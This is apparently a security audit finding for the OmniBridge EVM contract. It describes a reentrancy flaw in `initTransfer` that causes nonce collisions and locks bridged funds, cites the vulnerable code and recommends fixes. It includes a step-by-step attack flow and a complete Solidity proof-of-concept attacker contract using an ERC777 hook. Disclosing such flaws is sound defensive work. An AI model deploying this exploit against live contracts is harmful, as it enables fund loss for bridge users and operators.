### Title
Reentrancy in `initTransfer` Causes Nonce Collision and Irreversible Fund Lock - (File: `evm/src/omni-bridge/contracts/OmniBridge.sol`)

---

### Summary

`OmniBridge.initTransfer` increments `currentOriginNonce` at the top of the function but reads it again from storage **after** an external call to the token contract. A callback-enabled token (e.g., ERC777 `tokensToSend` hook, or any ERC20 with a `transferFrom` callback) can re-enter `initTransfer` during that external call. The re-entrant call increments the nonce a second time and emits an `InitTransfer` event with nonce N+1. When control returns to the outer call, it reads the now-stale storage value (N+1) and emits a second `InitTransfer` event with the same nonce N+1. NEAR's bridge deduplicates by nonce and processes only one of the two events; the outer call's tokens are permanently locked in the bridge with no redemption path.

---

### Finding Description

In `OmniBridge.sol`, `initTransfer` follows this sequence:

1. `currentOriginNonce += 1` — nonce written to storage (e.g., becomes 1).
2. External call: `IERC20(tokenAddress).safeTransferFrom(msg.sender, address(this), amount)` — control leaves the contract.
3. `initTransferExtension(..., currentOriginNonce, ...)` — reads nonce from **storage**.
4. `emit BridgeTypes.InitTransfer(..., currentOriginNonce, ...)` — reads nonce from **storage**. [1](#0-0) 

Because `currentOriginNonce` is a storage variable and is re-read **after** the external call (steps 3–4), any re-entrancy that modifies it during step 2 will cause the outer call to emit with the wrong nonce.

**Attack flow (ERC777 example):**

- Attacker deploys a contract `AttackerContract` that implements the ERC777 `tokensToSend` hook.
- `AttackerContract` calls `initTransfer(erc777Token, amount, ...)`.
- `currentOriginNonce` becomes 1.
- `safeTransferFrom` triggers the ERC777 `tokensToSend` hook on `AttackerContract`.
- Inside the hook, `AttackerContract` re-enters `initTransfer(erc777Token, amount, ...)`.
  - `currentOriginNonce` becomes 2.
  - Inner `safeTransferFrom` completes (tokens transferred).
  - `initTransferExtension(..., currentOriginNonce=2, ...)` called.
  - `emit InitTransfer(..., originNonce=2, ...)` — **event A emitted**.
- Control returns to outer call. `currentOriginNonce` in storage is now 2.
- Outer `safeTransferFrom` completes (tokens transferred).
- `initTransferExtension(..., currentOriginNonce=2, ...)` called.
- `emit InitTransfer(..., originNonce=2, ...)` — **event B emitted with same nonce**.

No reentrancy guard exists on `initTransfer`. The contract inherits `UUPSUpgradeable`, `AccessControlUpgradeable`, and `SelectivePausableUpgradable`, none of which provide reentrancy protection. [2](#0-1) 

The same pattern exists in `initTransfer1155`: [3](#0-2) 

Note: the Starknet implementation is **not** vulnerable because it stores the nonce in a local variable before the external call and uses that local variable in the event: [4](#0-3) 

---

### Impact Explanation

Two `InitTransfer` events are emitted with the same `originNonce` (e.g., 2). Nonce 1 is never emitted. On the NEAR side, `fin_transfer` deduplicates by nonce — the second event with nonce 2 is rejected as already finalized. The outer call's tokens (a full `amount` of ERC20) are held by the bridge contract but will never be redeemable: nonce 1 was never emitted, and nonce 2 is already consumed. This constitutes an **irreversible fund lock** of the outer call's token amount.

Additionally, nonce 1 is permanently skipped in the sequence, which may cause accounting or indexing divergence on the NEAR side.

---

### Likelihood Explanation

The attack requires a token whose `transferFrom` implementation invokes a callback on the sender before completing the transfer. ERC777 tokens (which call `tokensToSend` on the sender) are the canonical example and are deployed on mainnet. Any ERC20 with a non-standard `transferFrom` hook (e.g., fee-on-transfer tokens with sender callbacks, or tokens implementing EIP-1363) also qualifies. The bridge accepts arbitrary ERC20 tokens — there is no allowlist. The attacker needs only to deploy a contract that implements the callback and call `initTransfer` with a qualifying token. No privileged access is required.

---

### Recommendation

1. **Add a reentrancy guard.** Import OpenZeppelin's `ReentrancyGuardUpgradeable` and apply `nonReentrant` to `initTransfer` and `initTransfer1155`.

2. **Cache the nonce in a local variable** before any external call and use the local variable in `initTransferExtension` and `emit`:

```solidity
function initTransfer(...) external payable nonReentrant whenNotPaused(PAUSED_INIT_TRANSFER) {
    currentOriginNonce += 1;
    uint64 nonce = currentOriginNonce; // cache before external call
    ...
    IERC20(tokenAddress).safeTransferFrom(msg.sender, address(this), amount);
    ...
    initTransferExtension(msg.sender, tokenAddress, nonce, ...);
    emit BridgeTypes.InitTransfer(msg.sender, tokenAddress, nonce, ...);
}
```

Both mitigations together are recommended; the local-variable cache alone does not prevent re-entrancy from causing other state corruption.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC777/ERC777.sol";
import "@openzeppelin/contracts/interfaces/IERC1820Registry.sol";

interface IOmniBridge {
    function initTransfer(
        address tokenAddress,
        uint128 amount,
        uint128 fee,
        uint128 nativeFee,
        string calldata recipient,
        string calldata message
    ) external payable;
}

contract MaliciousERC777 is ERC777 {
    constructor(address[] memory defaultOperators)
        ERC777("Malicious", "MAL", defaultOperators) {}
}

contract AttackerContract is IERC777Recipient {
    IOmniBridge public bridge;
    MaliciousERC777 public token;
    bool public reentered;

    IERC1820Registry constant _ERC1820 =
        IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    constructor(address _bridge, address _token) {
        bridge = IOmniBridge(_bridge);
        token = MaliciousERC777(_token);
        _ERC1820.setInterfaceImplementer(
            address(this),
            keccak256("ERC777TokensRecipient"),
            address(this)
        );
        // Register as tokensToSend implementer
        _ERC1820.setInterfaceImplementer(
            address(this),
            keccak256("ERC777TokensSender"),
            address(this)
        );
    }

    // ERC777 tokensToSend hook — fires before transfer completes
    function tokensToSend(
        address, address, address, uint256, bytes calldata, bytes calldata
    ) external {
        if (!reentered) {
            reentered = true;
            // Re-enter initTransfer: currentOriginNonce becomes 2
            // Inner call emits InitTransfer(originNonce=2)
            bridge.initTransfer(address(token), 100, 0, 0, "near:bob.near", "");
        }
    }

    function tokensReceived(
        address, address, address, uint256, bytes calldata, bytes calldata
    ) external {}

    function attack() external {
        // Outer call: currentOriginNonce becomes 1, then safeTransferFrom triggers hook
        // After re-entrancy, outer call reads currentOriginNonce=2 and emits InitTransfer(originNonce=2)
        // Result: two events with originNonce=2; nonce=1 never emitted; outer tokens locked
        bridge.initTransfer(address(token), 100, 0, 0, "near:bob.near", "");
    }
}
```

After `attack()` executes:
- Two `InitTransfer` events are emitted, both with `originNonce = 2`.
- `originNonce = 1` is never emitted.
- The bridge holds 200 tokens; NEAR processes only 100 (inner call); the outer 100 tokens are permanently locked.

### Citations

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L28-34)
```text
contract OmniBridge is
    UUPSUpgradeable,
    AccessControlUpgradeable,
    SelectivePausableUpgradable,
    IERC1155Receiver
{
    using SafeERC20 for IERC20;
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L381-436)
```text
        currentOriginNonce += 1;
        if (fee >= amount) {
            revert InvalidFee();
        }

        uint256 extensionValue;
        if (tokenAddress == address(0)) {
            if (fee != 0) {
                revert InvalidFee();
            }
            extensionValue = msg.value - amount - nativeFee;
        } else {
            extensionValue = msg.value - nativeFee;
            if (customMinters[tokenAddress] != address(0)) {
                IERC20(tokenAddress).safeTransferFrom(
                    msg.sender,
                    customMinters[tokenAddress],
                    amount
                );
                ICustomMinter(customMinters[tokenAddress]).burn(
                    tokenAddress,
                    amount
                );
            } else if (isBridgeToken[tokenAddress]) {
                BridgeToken(tokenAddress).burn(msg.sender, amount);
            } else {
                IERC20(tokenAddress).safeTransferFrom(
                    msg.sender,
                    address(this),
                    amount
                );
            }
        }

        initTransferExtension(
            msg.sender,
            tokenAddress,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message,
            extensionValue
        );

        emit BridgeTypes.InitTransfer(
            msg.sender,
            tokenAddress,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message
        );
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L448-489)
```text
        currentOriginNonce += 1;
        if (fee >= amount) {
            revert InvalidFee();
        }

        address deterministicToken = deriveDeterministicAddress(
            tokenAddress,
            tokenId
        );

        IERC1155(tokenAddress).safeTransferFrom(
            msg.sender,
            address(this),
            tokenId,
            amount,
            ""
        );

        uint256 extensionValue = msg.value - nativeFee;

        initTransferExtension(
            msg.sender,
            deterministicToken,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message,
            extensionValue
        );

        emit BridgeTypes.InitTransfer(
            msg.sender,
            deterministicToken,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message
        );
```

**File:** starknet/src/omni_bridge.cairo (L295-330)
```text
            let origin_nonce = self.current_origin_nonce.read() + 1;
            self.current_origin_nonce.write(origin_nonce);

            let caller = get_caller_address();

            if self.is_bridge_token(token_address) {
                IBridgeTokenDispatcher { contract_address: token_address }
                    .burn(caller, amount.into());
            } else {
                let success = IERC20Dispatcher { contract_address: token_address }
                    .transfer_from(caller, get_contract_address(), amount.into());
                assert(success, 'ERR_TRANSFER_FROM_FAILED');
            }

            if native_fee > 0 {
                let native_token = self.strk_token_address.read();
                let success = IERC20Dispatcher { contract_address: native_token }
                    .transfer_from(caller, get_contract_address(), native_fee.into());
                assert(success, 'ERR_FEE_TRANSFER_FAILED');
            }

            self
                .emit(
                    Event::InitTransfer(
                        InitTransfer {
                            sender: caller,
                            token_address,
                            origin_nonce,
                            amount,
                            fee,
                            native_fee,
                            recipient,
                            message,
                        },
                    ),
                )
```
